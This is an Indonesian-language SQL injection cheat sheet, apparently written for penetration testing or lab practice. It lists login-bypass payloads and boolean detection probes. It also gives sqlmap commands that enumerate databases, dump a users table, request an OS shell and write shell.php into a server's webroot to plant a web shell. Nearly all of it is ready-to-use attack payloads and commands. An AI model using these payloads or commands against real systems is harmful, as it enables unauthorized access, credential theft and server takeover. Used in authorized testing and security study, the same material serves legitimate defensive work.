# SQL Injection

## Auth Bypass (login form)
```text
'  OR  '1'='1'-- -       # Bypass autentikasi dengan kondisi selalu benar
admin'-- -               # Mengabaikan bagian query setelah input
') OR ('1'='1            # Bypass pada query dengan tanda kurung
```

**Keterangan:**  
Auth bypass terjadi ketika input pengguna langsung dimasukkan ke query SQL
tanpa validasi atau parameterisasi yang aman.


## Deteksi (boolean)
```text
?id=1 AND 1=1             # Kondisi TRUE → response biasanya normal
?id=1 AND 1=2             # Kondisi FALSE → response dapat berbeda
```

**Keterangan:**  
Membandingkan response dari kondisi TRUE dan FALSE untuk mengetahui apakah
parameter kemungkinan dipengaruhi oleh SQL Injection.

---
## SQLMap (Otomatis)

### Menampilkan Database

```bash
sqlmap -u "http://<TARGET>:PORT/page?id=1" --batch --dbs
# Mendeteksi SQL Injection dan menampilkan database yang tersedia
```

### Menampilkan Tabel

```bash
sqlmap -u "http://<TARGET>:PORT/page?id=1" --batch -D <DB> --tables
# Menampilkan tabel pada database yang dipilih
```

### Dump Data Tabel

```bash
sqlmap -u "http://<TARGET>:PORT/page?id=1" --batch -D <DB> -T users --dump
# Mengambil data dari tabel users
```

---

## SQLMap → OS Shell

```bash
sqlmap -u "http://<TARGET>:PORT/page?id=1" --batch --os-shell
# Mencoba mendapatkan OS shell melalui SQL Injection
```

**Keterangan:**

```text
--os-shell membutuhkan kondisi tertentu, seperti:
- DBMS memiliki privilege yang memungkinkan eksekusi command
- Database memiliki akses FILE atau kemampuan serupa
- Webroot dapat ditulis oleh proses web/database
- Konfigurasi server memungkinkan teknik tersebut
```
Jika sqlmap meminta lokasi webroot:

```text
Default location
    ↓
Brute force direktori umum
    ↓
Custom location
    ↓
/var/www/<nama-apps>
```

**Catatan:**  
Lokasi webroot dapat diketahui dari konfigurasi server, dokumentasi aplikasi,
LFI, atau informasi error pada lingkungan pengujian.

---

## Menulis File ke Webroot

```bash
sqlmap -u "http://<TARGET>:PORT/page?id=1" --batch --file-write shell.php --file-dest /var/www/<nama-apps>/shell.php
```

**Keterangan:**

```text
--file-write  → File lokal yang akan ditulis
--file-dest   → Lokasi tujuan file pada server
```

Teknik ini membutuhkan privilege dan konfigurasi DBMS/server yang memungkinkan
database menulis file ke lokasi tujuan.

---
